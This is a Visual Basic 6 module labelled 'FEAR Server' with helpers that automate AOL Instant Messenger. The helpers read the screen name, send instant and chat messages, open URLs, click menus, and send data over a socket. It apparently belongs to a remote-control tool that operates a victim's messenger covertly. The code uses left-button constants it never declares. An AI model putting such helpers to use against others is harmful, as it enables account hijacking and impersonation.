Attribute VB_Name = "modMain"
'ModMain.bas  -  FEAR Server

Public Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Public Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Declare Function GetMenu Lib "user32" (ByVal hwnd As Long) As Long
Declare Function GetMenuItemCount Lib "user32" (ByVal hMenu As Long) As Long
Declare Function GetMenuItemID Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Declare Function GetSubMenu Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Declare Function GetMenuString Lib "user32" Alias "GetMenuStringA" (ByVal hMenu As Long, ByVal wIDItem As Long, ByVal lpString As String, ByVal nMaxCount As Long, ByVal wFlag As Long) As Long
Public Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Public Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
Public Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Public Declare Function SendMessageByString Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As String) As Long
Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long

Global Const SW_NORMAL = 1
Global Const VK_SPACE = &H20
Global Const WM_COMMAND = &H111
Public Const WM_GETTEXT = &HD
Public Const WM_GETTEXTLENGTH = &HE
Public Const WM_SETTEXT = &HC
Global Const WM_RBUTTONDOWN = &H204
Global Const WM_RBUTTONUP = &H205
Global Const WM_KEYUP = &H101
Global Const WM_KEYDOWN = &H100

Public chatShown As Boolean

'BASIC SUBS AND FUNCTIONS

Public Sub SD(data As String)
If frmMAIN.WS.State <> 7 Then
Exit Sub
End If
frmMAIN.WS.SendData data$
End Sub

Sub Pause(interval)
'Example: Pause 3
'Will Pause for 3 seconds
Current = timer
Do While timer - Current < Val(interval)
DoEvents
Loop
End Sub

Function GetCaptionofWnd(Window As String) As String
'Gets the caption of any window
Dim TheWindow As String
Dim thetext As Long
thetext& = GetWindowTextLength(Window$)
TheWindow$ = String(thetext&, 0&)
GetWindowText Window$, TheWindow$, thetext& + 1
GetCaptionofWnd$ = TheWindow$
End Function

Public Function GetText(Window As Long) As String
'Gets any text from a window
Dim Cursor As String, text As Long
text& = SendMessage(Window&, WM_GETTEXTLENGTH, 0&, 0&)
Cursor$ = String(text&, 0&)
Call SendMessageByString(Window&, WM_GETTEXT, text& + 1, Cursor$)
GetText$ = Cursor$
End Function

Sub GoToWebsite(Website As String)
If ShellExecute(&O0, "Open", Website$, vbNullString, vbNullString, SW_NORMAL) < 33 Then
End If
End Sub

Function ReplaceString(MyString As String, ToFind As String, ReplaceWith As String) As String
'Replaces a string
Dim Spot As Long, NewSpot As Long, LeftString As String
Dim RightString As String, NewString As String
Spot& = InStr(LCase(MyString$), LCase(ToFind))
NewSpot& = Spot&
Do
If NewSpot& > 0& Then
LeftString$ = Left(MyString$, NewSpot& - 1)
If Spot& + Len(ToFind$) <= Len(MyString$) Then
RightString$ = Right(MyString$, Len(MyString$) - NewSpot& - Len(ToFind$) + 1)
Else
RightString = ""
End If
NewString$ = LeftString$ & ReplaceWith$ & RightString$
MyString$ = NewString$
Else
NewString$ = MyString$
End If
Spot& = NewSpot& + Len(ReplaceWith$)
If Spot& > 0 Then
NewSpot& = InStr(Spot&, LCase(MyString$), LCase(ToFind$))
End If
Loop Until NewSpot& < 1
ReplaceString$ = NewString$
End Function

Public Sub SetText(Window As Long, ByVal text As String)
'Sets text in any window
Call SendMessageByString(Window&, WM_SETTEXT, 0, text$)
End Sub


'AIM SUBS AND FUNCTIONS

Function AIM_GetSN()
'Gets the persons screenname
'Example
'Text1.Text = AIM_GetSN
Dim getit As Long, name As String, Name2 As String
name$ = GetCaptionofWnd(GetBuddyListWnd&)
Name2$ = ReplaceString(name$, "'s Buddy List Window", "")
If Name2$ = "" Then
AIM_GetSN = "off"
Else
AIM_GetSN = Name2$
End If
End Function

Sub AIM_GotoBar(url As String)
'Uses the gotobar to visit a website
Dim GoToBarBtn As Long, GoToText As Long
GoToText& = FindWindowEx(GetBuddyListWnd&, 0, "Edit", vbNullString)
Call SetText(GoToText&, url$)
GoToBarBtn& = FindWindowEx(GetBuddyListWnd&, 0, "_Oscar_IconBtn", vbNullString)
ClickIcon (GoToBarBtn&)
End Sub

Function Chat_GetName() As String
Dim name As String, Name2 As String
name$ = GetCaptionofWnd(GetChatWnd&)
Name2$ = ReplaceString(name$, "Chat Room: ", "")
Chat_GetName$ = Name2$
End Function

Sub Chat_Send(text As String)
Dim Button1 As Long, Button2 As Long, Button3 As Long, Button4 As Long, Button5 As Long
Dim ChatText As Long, ChatText2 As Long
ChatText& = FindWindowEx(GetChatWnd&, 0, "WndAte32Class", vbNullString)
ChatText2& = FindWindowEx(GetChatWnd&, ChatText&, "WndAte32Class", vbNullString)
Button1& = FindWindowEx(GetChatWnd&, 0, "_Oscar_IconBtn", vbNullString)
Button2& = FindWindowEx(GetChatWnd&, Button1&, "_Oscar_IconBtn", vbNullString)
Button3& = FindWindowEx(GetChatWnd&, Button2&, "_Oscar_IconBtn", vbNullString)
Button4& = FindWindowEx(GetChatWnd&, Button3&, "_Oscar_IconBtn", vbNullString)
Button5& = FindWindowEx(GetChatWnd&, Button4&, "_Oscar_IconBtn", vbNullString)
Call SetText(ChatText2&, text$)
ClickIcon (Button5&)
End Sub

Function GetBuddyListWnd() As Long
'Finds the Buddy List Window
'You dont need to use this
GetBuddyListWnd& = FindWindow("_Oscar_BuddyListWin", vbNullString)
End Function

Function GetChatWnd() As Long
GetChatWnd& = FindWindow("Aim_Chatwnd", vbNullString)
End Function

Function GetIMWnd() As Long
GetIMWnd& = FindWindow("AIM_IMessage", vbNullString)
End Function

Sub IM_Send(who As String, message As String)
Dim WhoBox As Long, MessageBox As Long, MessageBox1 As Long, Btn As Long
Call ClickMenu(GetBuddyListWnd&, "&People")
Call ClickMenu(GetBuddyListWnd&, "Send &Instant Message")
WhoBox& = FindWindowEx(GetIMWnd&, 0, "_Oscar_PersistantCombo", vbNullString)
MessageBox& = FindWindowEx(GetIMWnd&, 0, "WndAte32Class", vbNullString)
MessageBox1& = FindWindowEx(GetIMWnd&, MessageBox&, "WndAte32Class", vbNullString)
Call SetText(WhoBox&, who$)
Call SetText(MessageBox1, message$)
Call ClickIcon(FindWindowEx(GetIMWnd&, 0, "_Oscar_IconBtn", vbNullString))
End Sub

Sub ClickButton(Button As Long)
Dim ClickIt As Long
ClickIt& = SendMessage(Button&, WM_KEYDOWN, VK_SPACE, vbNullString)
ClickIt& = SendMessage(Button&, WM_KEYUP, VK_SPACE, vbNullString)
End Sub

Sub ClickIcon(IcontoClick As Long)
Dim ClickIt As Long
ClickIt& = SendMessage(IcontoClick&, WM_LBUTTONDOWN, 0, 0&)
ClickIt& = SendMessage(IcontoClick&, WM_LBUTTONUP, 0, 0&)
End Sub

Sub ClickMenu(MenuHwnd As Long, MenuText As String)
On Error Resume Next
Dim MenuHandle  As Long, MenuCount As Integer, MenuIndex As Long, MenuHandle2 As Long, MenuItemCount As Integer, MenuSubIndex As Long, MenuSubCount As Integer, MenuString As String, MenuSubIndexMenu As Integer, MenuItem As Integer
MenuHandle& = GetMenu(MenuHwnd)
MenuCount% = GetMenuItemCount(MenuHandle&)
For MenuIndex = 0 To MenuCount% - 1
MenuHandle2& = GetSubMenu(MenuHandle&, MenuIndex)
MenuItemCount% = GetMenuItemCount(MenuHandle2&)
For MenuSubIndex = 0 To MenuItemCount% - 1
MenuSubCount% = GetMenuItemID(MenuHandle2&, MenuSubIndex)
MenuString$ = String$(100, " ")
MenuSubIndexMenu% = GetMenuString(MenuHandle2&, MenuSubCount%, MenuString$, 100, 1)
If InStr(UCase(MenuString$), UCase(MenuText$)) Then
MenuItem% = MenuSubCount%
Call SendMessage(MenuHwnd, WM_COMMAND, MenuItem%, 0)
Exit Sub
End If
Next MenuSubIndex
Next MenuIndex
End Sub

